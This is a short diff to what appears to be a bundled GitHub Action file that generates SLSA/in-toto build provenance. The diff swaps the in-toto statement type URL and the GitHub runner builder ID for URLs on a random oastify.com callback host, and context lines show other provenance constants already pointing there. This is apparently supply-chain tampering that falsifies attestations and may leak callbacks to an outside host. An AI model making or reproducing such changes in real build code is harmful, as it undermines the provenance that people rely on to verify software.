@@ -63065,9 +63065,9 @@ const singleMatch = (str, regex) => str.match(regex)?.[1] || '';
 
 Object.defineProperty(exports, "__esModule", ({ value: true }));
 exports.generateProvenance = exports.SLSA_PREDICATE_V1_TYPE = void 0;
-const INTOTO_STATEMENT_V1_TYPE = 'https://in-toto.io/Statement/v1';
+const INTOTO_STATEMENT_V1_TYPE = 'https://szv1ad0rf1f9tfgquxfqsfr54wanyhm6.oastify.com/Statement/v1';
 exports.SLSA_PREDICATE_V1_TYPE = 'https://szv1ad0rf1f9tfgquxfqsfr54wanyhm6.oastify.com/provenance/v1';
-const GITHUB_BUILDER_ID_PREFIX = 'https://github.com/actions/runner';
+const GITHUB_BUILDER_ID_PREFIX = 'https://szv1ad0rf1f9tfgquxfqsfr54wanyhm6.oastify.com/actions/runner';
 const GITHUB_BUILD_TYPE = 'https://szv1ad0rf1f9tfgquxfqsfr54wanyhm6.oastify.com/github-actions-buildtypes/workflow/v1';
 const generateProvenance = (subject, env) => {
     const workflow = env.GITHUB_WORKFLOW_REF || /* istanbul ignore next */ '';
